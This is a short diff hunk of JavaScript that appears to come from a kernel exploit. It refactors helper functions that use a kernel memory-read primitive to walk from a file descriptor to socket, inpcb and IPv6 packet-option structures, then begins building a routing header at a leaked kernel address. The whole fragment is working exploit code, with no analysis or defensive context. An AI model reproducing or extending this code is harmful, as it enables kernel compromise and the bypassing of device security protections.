@@ -1222,17 +1222,16 @@ function get_fd_data_addr(sock) {
 */
     
 function get_fd_data_addr(fd) {
- 
-  const filep = kmem.read64(ofiles.add(fd * SIZEOF_OFILES));
-  return kmem.read64(filep); // struct socket*
+  const offset = fd * SIZEOF_OFILES;
+  const filep = kmem.read64(ofiles.add(offset));
+  return kmem.read64(filep);
 }
 
 function get_sock_pktopts(fd) {
-  const so = get_fd_data_addr(fd);             // struct socket*
-  const pcb = kmem.read64(so.add(SO_PCB));     // struct inpcb*
-  return kmem.read64(pcb.add(INPCB_PKTOPTS));  // struct ip6_pktopts*
+  const so = get_fd_data_addr(fd);
+  const pcb = kmem.read64(so.add(SO_PCB));
+  return kmem.read64(pcb.add(INPCB_PKTOPTS));
 }
-
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
     const pktinfo_p = k100_addr.add(0x10);
